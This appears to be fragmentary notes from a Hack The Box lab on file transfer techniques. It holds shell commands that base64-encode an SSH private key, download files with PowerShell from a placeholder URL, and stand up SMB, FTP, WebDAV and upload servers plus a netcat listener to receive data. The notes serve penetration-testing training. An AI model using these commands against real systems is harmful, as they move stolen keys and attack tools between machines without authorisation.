...
```
frank-106@htb[/htb]$ cat id_rsa |base64 -w 0;echo
...
```
S C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
...
````
frank-106@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
...
```
frank-106@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
...
> frank-106@htb[/htb]$ sudo pip3 install pyftpdlib
...
````
frank-106@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
...
Installing:
````
frank-106@htb[/htb]$ pip3 install uploadserver
...
Starting server:
```
frank-106@htb[/htb]$ python3 -m uploadserver
...
```
frank-106@htb[/htb]$ nc -lvnp 8000
...
> frank-106@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
...
```
frank-106@htb[/htb]$ sudo pip3 install wsgidav cheroot
...
```
frank-106@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
...
```
frank-106@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
